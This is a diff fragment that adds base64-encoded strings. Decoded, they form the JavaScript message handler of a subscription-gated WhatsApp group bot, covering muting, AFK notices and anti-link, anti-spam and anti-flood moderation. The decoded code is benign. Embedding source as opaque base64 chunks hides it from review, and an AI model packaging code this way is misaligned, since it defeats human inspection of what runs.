+    "ZXdvbmNlIGNyYXNoOicsIGUubWVzc2FnZSk7IH0KICAgIH0KICB9KTsKCiAgcmV0dXJuIHNvY2s7Cn0K",
+    "Ci8vIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV",
+    "kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkAovLyBoYW5kbGVNZXNz",
+    "YWdlIOKAlCBhbGwgcHJvdGVjdGlvbnMgKyBwZXItdXNlciBwcmVmaXgKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCmFzeW5jIGZ1bmN0aW9uIGhhbmRsZU1lc3NhZ2Uoc29j",
+    "aywgbXNnLCB1c2VySWQpIHsKICB0cnkgewogICAgaWYgKCFtc2c/Lm1lc3NhZ2UpIHJldHVybjsKICAg",
+    "IGNvbnN0IGppZCA9IG1zZy5rZXkucmVtb3RlSmlkOwogICAgaWYgKCFqaWQpIHJldHVybjsKCiAgICAv",
+    "LyBFeHRyYWN0IHRleHQgZWFybHkgc28gd2UgY2FuIGNoZWNrIHByZWZpeCBiZWZvcmUgdGhlIGZyb21N",
+    "ZSBibG9jawogICAgY29uc3QgcmF3VGV4dCAgPSBleHRyYWN0VGV4dChtc2cpLnRyaW0oKTsKICAgIGNv",
+    "bnN0IFBSRUZJWCAgID0gZ2V0UHJlZml4KHVzZXJJZCk7CgogICAgY29uc3Qgc2VsZkppZCAgICA9IHNv",
+    "Y2sudXNlcj8uaWQ/LnNwbGl0KCc6JylbMF0gKyAnQHMud2hhdHNhcHAubmV0JzsKICAgIGNvbnN0IGlz",
+    "U2VsZkNoYXQgPSBqaWQgPT09IHNlbGZKaWQ7CgogICAgLy8gQ1JJVElDQUwgRklYOiBBbGxvdyBmcm9t",
+    "TWUgbWVzc2FnZXMgaWY6CiAgICAvLyAxLiBJdCdzIHNlbGYtY2hhdCAob3duZXIgbWVzc2FnaW5nIHRo",
+    "ZWlyIG93biBudW1iZXIpLCBPUgogICAgLy8gMi4gSXQncyBhIHByZWZpeCBjb21tYW5kIChvd25lciBj",
+    "b250cm9sbGluZyBib3QgZnJvbSB0aGVpciBvd24gV2hhdHNBcHAgaW4gYW55IGNoYXQpCiAgICAvLyBU",
+    "aGlzIGxldHMgdGhlIGJvdCBvd25lciB1c2UgY29tbWFuZHMgZnJvbSB0aGVpciBvd24gYWNjb3VudCBp",
+    "biBncm91cHMvRE1zCiAgICBpZiAobXNnLmtleT8uZnJvbU1lICYmICFpc1NlbGZDaGF0ICYmICFyYXdU",
+    "ZXh0LnN0YXJ0c1dpdGgoUFJFRklYKSkgcmV0dXJuOwoKICAgIGNvbnN0IHNlbmRlciAgID0gbXNnLmtl",
+    "eS5wYXJ0aWNpcGFudCB8fCAobXNnLmtleS5mcm9tTWUgPyBzZWxmSmlkIDogamlkKTsKICAgIGNvbnN0",
+    "IG93bmVyTnVtID0gKHNlc3Npb25zW3VzZXJJZF0/LnBob25lTnVtYmVyIHx8ICcnKS5yZXBsYWNlKC9c",
+    "RC9nLCAnJyk7CiAgICAvLyBmcm9tTWUgbWVhbnMgdGhlIG1lc3NhZ2UgaXMgRlJPTSB0aGUgYm90J3Mg",
+    "YWNjb3VudCA9IGFsd2F5cyB0aGUgb3duZXIKICAgIGNvbnN0IGlzT3duZXIgID0gbXNnLmtleS5mcm9t",
+    "TWUgPT09IHRydWUKICAgICAgICAgICAgICAgICAgfHwgc2VuZGVyLnNwbGl0KCdAJylbMF0gPT09IG93",
+    "bmVyTnVtCiAgICAgICAgICAgICAgICAgIHx8IGppZC5zcGxpdCgnQCcpWzBdID09PSBvd25lck51bTsK",
+    "ICAgIGNvbnN0IGlzR3JvdXAgID0gamlkLmVuZHNXaXRoKCdAZy51cycpOwogICAgY29uc3QgdGV4dCAg",
+    "ICAgPSBleHRyYWN0VGV4dChtc2cpLnRyaW0oKTsKCiAgICAvLyDilIDilIAgQmFubmVkIHVzZXIgY2hl",
+    "Y2sg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBjb25zdCBzZW5kZXJOdW0gPSBzZW5kZXIgPyBz",
+    "ZW5kZXIuc3BsaXQoJ0AnKVswXSA6ICcnOwogICAgaWYgKHNlbmRlck51bSAmJiB1c2VyU3RvcmUuaXNC",
+    "YW5uZWQoc2VuZGVyTnVtKSkgewogICAgICAvLyBTaWxlbnRseSBpZ25vcmUgYmFubmVkIHVzZXJzCiAg",
+    "ICAgIHJldHVybjsKICAgIH0KCiAgICAvLyDilIDilIAgQWN0aXZhdGlvbiBnYXRlIOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgLy8gQm90IG9ubHkgcmVzcG9uZHMgdG8gb3duZXIgT1Ig",
+    "dXNlcnMgd2l0aCBhY3RpdmUgc3Vic2NyaXB0aW9ucwogICAgaWYgKCFpc093bmVyKSB7CiAgICAgIGlm",
+    "ICghdXNlclN0b3JlLmlzVXNlckFjdGl2ZSh1c2VySWQpKSB7CiAgICAgICAgLy8gU2lsZW50bHkgaWdu",
+    "b3JlIOKAlCBub3QgYWN0aXZhdGVkIG9yIHN1YnNjcmlwdGlvbiBleHBpcmVkCiAgICAgICAgcmV0dXJu",
+    "OwogICAgICB9CiAgICB9CgogICAgLy8g4pSA4pSAIE1haW50ZW5hbmNlIG1vZGUg4oCUIG9ubHkgb3du",
+    "ZXIgcGFzc2VzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgaWYgKHNldHRpbmdzLmdldCgnbWFpbnRlbmFuY2U6",
+    "JyArIHVzZXJJZCkgJiYgIWlzT3duZXIpIHJldHVybjsKCiAgICAvLyDilIDilIAgVHJhY2sgYWN0aXZp",
+    "dHkgZm9yIHRhZ2FjdGl2ZS90YWdpbmFjdGl2ZSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgIGlmIChpc0dyb3VwICYmICFtc2cu",
+    "a2V5LmZyb21NZSAmJiBzZW5kZXIpIHsKICAgICAgc2V0dGluZ3Muc2V0KCdsYXN0bXNnOicgKyBqaWQg",
+    "KyAnOicgKyBzZW5kZXIsIERhdGUubm93KCkpOwogICAgfQoKICAgIC8vIOKUgOKUgCBNdXRlIGJ5IHRp",
+    "bWUg4oCUIGRlbGV0ZSBhbGwgbWVzc2FnZXMgZnJvbSBtdXRlZCB1c2VyIOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgAogICAgaWYgKGlzR3JvdXAgJiYgIWlzT3duZXIpIHsKICAgICAgY29uc3Qg",
+    "bXV0ZUtleSAgICA9ICdtdXRlZDonICsgamlkICsgJzonICsgc2VuZGVyOwogICAgICBjb25zdCBtdXRl",
+    "RXhwaXJ5ID0gc2V0dGluZ3MuZ2V0KG11dGVLZXkpOwogICAgICBpZiAobXV0ZUV4cGlyeSkgewogICAg",
+    "ICAgIGlmIChEYXRlLm5vdygpIDwgbXV0ZUV4cGlyeSkgewogICAgICAgICAgYXdhaXQgc29jay5zZW5k",
+    "TWVzc2FnZShqaWQsIHsgZGVsZXRlOiBtc2cua2V5IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAg",
+    "IGNvbnN0IG1pbnNMZWZ0ID0gTWF0aC5jZWlsKChtdXRlRXhwaXJ5IC0gRGF0ZS5ub3coKSkgLyA2MDAw",
+    "MCk7CiAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgewogICAgICAgICAgICB0ZXh0",
+    "OiAn8J+UhyBAJyArIHNlbmRlci5zcGxpdCgnQCcpWzBdICsgJyB5b3UgYXJlIG11dGVkIGZvciAnICsg",
+    "bWluc0xlZnQgKyAnIG1vcmUgbWludXRlKHMpLiBZb3VyIG1lc3NhZ2VzIHdpbGwgYmUgZGVsZXRlZC4n",
+    "LAogICAgICAgICAgICBtZW50aW9uczogW3NlbmRlcl0sCiAgICAgICAgICB9KS5jYXRjaCgoKSA9PiB7",
+    "fSk7CiAgICAgICAgICByZXR1cm47CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgIHNldHRpbmdzLmRl",
+    "bChtdXRlS2V5KTsKICAgICAgICB9CiAgICAgIH0KICAgIH0KCiAgICAvLyDilIDilIAgQ291bnQgZXZl",
+    "cnkgaW5jb21pbmcgbWVzc2FnZSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAK",
+    "ICAgIHN0YXRzLnJlY29yZE1lc3NhZ2UoKTsKCiAgICAvLyDilIDilIAgQXV0by1yZWFkIChzaWxlbnQs",
+    "IGFsbCBtZXNzYWdlcykg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBpZiAoc2V0dGluZ3Mu",
+    "Z2V0KCdhdXRvcmVhZDonICsgdXNlcklkKSkKICAgICAgYXdhaXQgc29jay5yZWFkTWVzc2FnZXMoW21z",
+    "Zy5rZXldKS5jYXRjaCgoKSA9PiB7fSk7CgogICAgLy8g4pSA4pSAIEFGSzogY2xlYXIgaWYgQUZLIHBl",
+    "cnNvbiBzZW5kcyBhIG1lc3NhZ2Ug4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICBjb25zdCBhZmtLZXkgID0gJ2FmazonICsgdXNl",
+    "cklkICsgJzonICsgc2VuZGVyOwogICAgaWYgKHNldHRpbmdzLmdldChhZmtLZXkpKSB7CiAgICAgIHNl",
+    "dHRpbmdzLmRlbChhZmtLZXkpOwogICAgICBzZXR0aW5ncy5kZWwoJ2Fma2RhdGE6JyArIHVzZXJJZCAr",
+    "ICc6JyArIHNlbmRlcik7CiAgICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7CiAgICAgICAg",
+    "dGV4dDogJ/CfkYsgV2VsY29tZSBiYWNrIConICsgKG1zZy5wdXNoTmFtZSB8fCBzZW5kZXIuc3BsaXQo",
+    "J0AnKVswXSkgKyAnKiEgWW91ciBBRksgc3RhdHVzIGhhcyBiZWVuIHJlbW92ZWQuJywKICAgICAgfSku",
+    "Y2F0Y2goKCkgPT4ge30pOwogICAgfQoKICAgIC8vIOKUgOKUgCBBRks6IG5vdGlmeSBpZiBzb21lb25l",
+    "IG1lbnRpb25zIGFuIEFGSyB1c2VyIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgAogICAgY29uc3QgbWVudGlvbmVkID0gbXNnLm1lc3NhZ2U/LmV4dGVu",
+    "ZGVkVGV4dE1lc3NhZ2U/LmNvbnRleHRJbmZvPy5tZW50aW9uZWRKaWQgfHwgW107CiAgICBmb3IgKGNv",
+    "bnN0IG1lbnRpb25lZEppZCBvZiBtZW50aW9uZWQpIHsKICAgICAgY29uc3QgbUFma0tleSA9ICdhZms6",
+    "JyArIHVzZXJJZCArICc6JyArIG1lbnRpb25lZEppZDsKICAgICAgaWYgKHNldHRpbmdzLmdldChtQWZr",
+    "S2V5KSkgewogICAgICAgIGNvbnN0IHJhdyAgPSBzZXR0aW5ncy5nZXQoJ2Fma2RhdGE6JyArIHVzZXJJ",
+    "ZCArICc6JyArIG1lbnRpb25lZEppZCkgfHwgJ3t9JzsKICAgICAgICBjb25zdCBkYXRhID0gSlNPTi5w",
+    "YXJzZShyYXcpOwogICAgICAgIGNvbnN0IG1pbnMgPSBNYXRoLmZsb29yKChEYXRlLm5vdygpIC0gKGRh",
+    "dGEuc2luY2UgfHwgRGF0ZS5ub3coKSkpIC8gNjAwMDApOwogICAgICAgIGF3YWl0IHNvY2suc2VuZE1l",
+    "c3NhZ2UoamlkLCB7CiAgICAgICAgICB0ZXh0OiAn8J+SpCAqQCcgKyBtZW50aW9uZWRKaWQuc3BsaXQo",
+    "J0AnKVswXSArICcqIGlzIEFGSycgKwogICAgICAgICAgICAgICAgKGRhdGEucmVhc29uID8gJ1xu8J+T",
+    "nSBSZWFzb246ICcgKyBkYXRhLnJlYXNvbiA6ICcnKSArCiAgICAgICAgICAgICAgICAnXG7ij7HvuI8g",
+    "U2luY2U6ICcgKyBtaW5zICsgJyBtaW51dGVzIGFnbycsCiAgICAgICAgICBtZW50aW9uczogW21lbnRp",
+    "b25lZEppZF0sCiAgICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICB9CiAgICB9CgogICAgLy8g",
+    "4pSA4pSAIEdyb3VwIHByb3RlY3Rpb25zIChydW4gb24gQUxMIG1lc3NhZ2VzLCBub3QganVzdCBwcmVm",
+    "aXgpIOKUgOKUgOKUgOKUgOKUgAoKICAgIGlmIChpc0dyb3VwKSB7CiAgICAgIC8vIEFudGlsaW5rIOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgICBpZiAoc2V0dGluZ3Mu",
+    "Z2V0KCdhbnRpbGluazonICsgamlkKSkgewogICAgICAgIGNvbnN0IHVybFJ4ID0gLyhodHRwcz86XC9c",
+    "L1teXHNdK3x3d3dcLlteXHNdK3x3YVwubWVcL1teXHNdK3xjaGF0XC53aGF0c2FwcFwuY29tXC9bXlxz",
+    "XSspL2k7CiAgICAgICAgaWYgKHVybFJ4LnRlc3QodGV4dCkpIHsKICAgICAgICAgIGNvbnN0IGFkbWlu",
+    "ID0gYXdhaXQgaXNHcm91cEFkbWluKHNvY2ssIGppZCwgc2VuZGVyKTsKICAgICAgICAgIGlmICghYWRt",
+    "aW4pIHsKICAgICAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgZGVsZXRlOiBtc2cu",
+    "a2V5IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgY29uc3Qgd2sgPSAnd2FybnM6JyArIGpp",
+    "ZCArICc6JyArIHNlbmRlcjsKICAgICAgICAgICAgY29uc3Qgd2MgPSAoc2V0dGluZ3MuZ2V0KHdrKSB8",
+    "fCAwKSArIDE7CiAgICAgICAgICAgIHNldHRpbmdzLnNldCh3aywgd2MpOwogICAgICAgICAgICBjb25z",
+    "dCBudW0gPSBzZW5kZXIuc3BsaXQoJ0AnKVswXTsKICAgICAgICAgICAgaWYgKHdjID49IDMpIHsKICAg",
+    "ICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiAn4puUIEAnICsgbnVt",
+    "ICsgJyByZW1vdmVkIGZvciBzaGFyaW5nIGxpbmtzIDMgdGltZXMuJywgbWVudGlvbnM6IFtzZW5kZXJd",
+    "IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgICBhd2FpdCBzb2NrLmdyb3VwUGFydGljaXBh",
+    "bnRzVXBkYXRlKGppZCwgW3NlbmRlcl0sICdyZW1vdmUnKS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAg",
+    "ICAgICAgc2V0dGluZ3MuZGVsKHdrKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICBh",
+    "d2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiAn8J+aqyBAJyArIG51bSArICcgbGlua3Mg",
+    "bm90IGFsbG93ZWQhXG7imqDvuI8gV2FybmluZyAqJyArIHdjICsgJy8zKiDigJQgUmVtb3ZlZCBhdCAz",
+    "IHdhcm5zLicsIG1lbnRpb25zOiBbc2VuZGVyXSB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAg",
+    "IH0KICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQoKICAgICAg",
+    "Ly8gQW50aS1iYWR3b3JkIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgICBpZiAoc2V0",
+    "dGluZ3MuZ2V0KCdhbnRpYmFkd29yZDonICsgamlkKSAmJiB0ZXh0KSB7CiAgICAgICAgY29uc3QgYmFk",
+    "cyA9IChzZXR0aW5ncy5nZXQoJ2JhZHdvcmRzOicgKyBqaWQpIHx8ICcnKS5zcGxpdCgnLCcpLmZpbHRl",
+    "cihCb29sZWFuKTsKICAgICAgICBpZiAoYmFkcy5zb21lKHcgPT4gdGV4dC50b0xvd2VyQ2FzZSgpLmlu",
+    "Y2x1ZGVzKHcudG9Mb3dlckNhc2UoKS50cmltKCkpKSkgewogICAgICAgICAgY29uc3QgYWRtaW4gPSBh",
+    "d2FpdCBpc0dyb3VwQWRtaW4oc29jaywgamlkLCBzZW5kZXIpOwogICAgICAgICAgaWYgKCFhZG1pbikg",
+    "ewogICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgeyBkZWxldGU6IG1zZy5rZXkg",
+    "fSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwg",
+    "eyB0ZXh0OiAn8J+aqyBQbGVhc2Ugd2F0Y2ggeW91ciBsYW5ndWFnZSEnIH0pLmNhdGNoKCgpID0+IHt9",
+    "KTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQoKICAgICAg",
+    "Ly8gQmxhY2tsaXN0IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU",
+    "gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogICAgICBp",
+    "ZiAoc2V0dGluZ3MuZ2V0KCdibGFja2xpc3RvbjonICsgamlkKSAmJiB0ZXh0KSB7CiAgICAgICAgY29u",
+    "c3QgbGlzdCA9IChzZXR0aW5ncy5nZXQoJ2JsYWNrbGlzdDonICsgamlkKSB8fCAnJykuc3BsaXQoJywn",
+    "KS5maWx0ZXIoQm9vbGVhbik7CiAgICAgICAgaWYgKGxpc3Quc29tZSh3ID0+IHRleHQudG9Mb3dlckNh",
+    "c2UoKS5pbmNsdWRlcyh3LnRvTG93ZXJDYXNlKCkudHJpbSgpKSkpIHsKICAgICAgICAgIGNvbnN0IGFk",
+    "bWluID0gYXdhaXQgaXNHcm91cEFkbWluKHNvY2ssIGppZCwgc2VuZGVyKTsKICAgICAgICAgIGlmICgh",
+    "YWRtaW4pIHsKICAgICAgICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgZGVsZXRlOiBt",
+    "c2cua2V5IH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICAgICAgY29uc3Qgd2sgPSAnd2FybnM6JyAr",
+    "IGppZCArICc6JyArIHNlbmRlcjsKICAgICAgICAgICAgY29uc3Qgd2MgPSAoc2V0dGluZ3MuZ2V0KHdr",
+    "KSB8fCAwKSArIDE7CiAgICAgICAgICAgIHNldHRpbmdzLnNldCh3aywgd2MpOwogICAgICAgICAgICBj",
+    "b25zdCBudW0gPSBzZW5kZXIuc3BsaXQoJ0AnKVswXTsKICAgICAgICAgICAgaWYgKHdjID49IDMpIHsK",
+    "ICAgICAgICAgICAgICBhd2FpdCBzb2NrLnNlbmRNZXNzYWdlKGppZCwgeyB0ZXh0OiAn4puUIEAnICsg",
+    "bnVtICsgJyByZW1vdmVkIGZvciB1c2luZyBibGFja2xpc3RlZCB3b3Jkcy4nLCBtZW50aW9uczogW3Nl",
+    "bmRlcl0gfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICAgIGF3YWl0IHNvY2suZ3JvdXBQYXJ0",
+    "aWNpcGFudHNVcGRhdGUoamlkLCBbc2VuZGVyXSwgJ3JlbW92ZScpLmNhdGNoKCgpID0+IHt9KTsKICAg",
+    "ICAgICAgICAgICBzZXR0aW5ncy5kZWwod2spOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAg",
+    "ICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IHRleHQ6ICfwn5qrIEAnICsgbnVtICsgJyBi",
+    "bGFja2xpc3RlZCB3b3JkIGRldGVjdGVkIVxu4pqg77iPIFdhcm5pbmcgKicgKyB3YyArICcvMyonLCBt",
+    "ZW50aW9uczogW3NlbmRlcl0gfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAgICB9CiAgICAgICAg",
+    "ICAgIHJldHVybjsKICAgICAgICAgIH0KICAgICAgICB9CiAgICAgIH0KCiAgICAgIC8vIEFudGlmbG9v",
+    "ZCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi",
+    "lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICAgICAgaWYgKHNldHRpbmdz",
+    "LmdldCgnYW50aWZsb29kOicgKyBqaWQpKSB7CiAgICAgICAgY29uc3QgYWRtaW4gPSBhd2FpdCBpc0dy",
+    "b3VwQWRtaW4oc29jaywgamlkLCBzZW5kZXIpOwogICAgICAgIGlmICghYWRtaW4pIHsKICAgICAgICAg",
+    "IGNvbnN0IGxpbWl0ID0gc2V0dGluZ3MuZ2V0KCdmbG9vZGxpbWl0OicgKyBqaWQpIHx8IDU7CiAgICAg",
+    "ICAgICBjb25zdCBmS2V5ICA9IGppZCArICdfJyArIHNlbmRlcjsKICAgICAgICAgIGlmICghZmxvb2RU",
+    "cmFja2VyW2ZLZXldKSBmbG9vZFRyYWNrZXJbZktleV0gPSB7IGNvdW50OiAwLCB0aW1lcjogbnVsbCB9",
+    "OwogICAgICAgICAgZmxvb2RUcmFja2VyW2ZLZXldLmNvdW50Kys7CiAgICAgICAgICBjbGVhclRpbWVv",
+    "dXQoZmxvb2RUcmFja2VyW2ZLZXldLnRpbWVyKTsKICAgICAgICAgIGZsb29kVHJhY2tlcltmS2V5XS50",
+    "aW1lciA9IHNldFRpbWVvdXQoKCkgPT4geyBkZWxldGUgZmxvb2RUcmFja2VyW2ZLZXldOyB9LCA1MDAw",
+    "KTsKICAgICAgICAgIGlmIChmbG9vZFRyYWNrZXJbZktleV0uY291bnQgPj0gbGltaXQpIHsKICAgICAg",
+    "ICAgICAgZGVsZXRlIGZsb29kVHJhY2tlcltmS2V5XTsKICAgICAgICAgICAgY29uc3Qgd2sgID0gJ3dh",
+    "cm5zOicgKyBqaWQgKyAnOicgKyBzZW5kZXI7CiAgICAgICAgICAgIGNvbnN0IHdjICA9IChzZXR0aW5n",
+    "cy5nZXQod2spIHx8IDApICsgMTsKICAgICAgICAgICAgc2V0dGluZ3Muc2V0KHdrLCB3Yyk7CiAgICAg",
+    "ICAgICAgIGNvbnN0IG51bSA9IHNlbmRlci5zcGxpdCgnQCcpWzBdOwogICAgICAgICAgICBpZiAod2Mg",
+    "Pj0gMykgewogICAgICAgICAgICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IHRleHQ6ICfi",
+    "m5QgQCcgKyBudW0gKyAnIHJlbW92ZWQgZm9yIGZsb29kaW5nLicsIG1lbnRpb25zOiBbc2VuZGVyXSB9",
+    "KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgICAgYXdhaXQgc29jay5ncm91cFBhcnRpY2lwYW50",
+    "c1VwZGF0ZShqaWQsIFtzZW5kZXJdLCAncmVtb3ZlJykuY2F0Y2goKCkgPT4ge30pOwogICAgICAgICAg",
+    "ICAgIHNldHRpbmdzLmRlbCh3ayk7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgYXdh",
+    "aXQgc29jay5zZW5kTWVzc2FnZShqaWQsIHsgdGV4dDogJ/CfjIogQCcgKyBudW0gKyAnIHNlbmRpbmcg",
+    "dG9vIGZhc3QhXG7imqDvuI8gV2FybmluZyAqJyArIHdjICsgJy8zKicsIG1lbnRpb25zOiBbc2VuZGVy",
+    "XSB9KS5jYXRjaCgoKSA9PiB7fSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuOwogICAg",
+    "ICAgICAgfQogICAgICAgIH0KICAgICAgfQoKICAgICAgLy8gQW50aXNwYW0gKHNhbWUgbWVzc2FnZSAz",
+    "eCkg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICAg",
+    "IGlmIChzZXR0aW5ncy5nZXQoJ2FudGlzcGFtOicgKyBqaWQpICYmIHRleHQpIHsKICAgICAgICBjb25z",
+    "dCBhZG1pbiA9IGF3YWl0IGlzR3JvdXBBZG1pbihzb2NrLCBqaWQsIHNlbmRlcik7CiAgICAgICAgaWYg",
+    "KCFhZG1pbikgewogICAgICAgICAgY29uc3Qgc0tleSA9IGppZCArICdfc3BhbV8nICsgc2VuZGVyOwog",
+    "ICAgICAgICAgaWYgKCFzcGFtVHJhY2tlcltzS2V5XSkgc3BhbVRyYWNrZXJbc0tleV0gPSB7IGxhc3RU",
+    "ZXh0OiAnJywgY291bnQ6IDAsIHRpbWVyOiBudWxsIH07CiAgICAgICAgICBpZiAodGV4dCA9PT0gc3Bh",
+    "bVRyYWNrZXJbc0tleV0ubGFzdFRleHQpIHsKICAgICAgICAgICAgc3BhbVRyYWNrZXJbc0tleV0uY291",
+    "bnQrKzsKICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNwYW1UcmFja2VyW3NLZXldLnRpbWVyKTsKICAg",
+    "ICAgICAgICAgc3BhbVRyYWNrZXJbc0tleV0udGltZXIgPSBzZXRUaW1lb3V0KCgpID0+IHsgZGVsZXRl",
+    "IHNwYW1UcmFja2VyW3NLZXldOyB9LCAxMDAwMCk7CiAgICAgICAgICAgIGlmIChzcGFtVHJhY2tlcltz",
+    "S2V5XS5jb3VudCA+PSAzKSB7CiAgICAgICAgICAgICAgZGVsZXRlIHNwYW1UcmFja2VyW3NLZXldOwog",
+    "ICAgICAgICAgICAgIGF3YWl0IHNvY2suc2VuZE1lc3NhZ2UoamlkLCB7IGRlbGV0ZTogbXNnLmtleSB9",
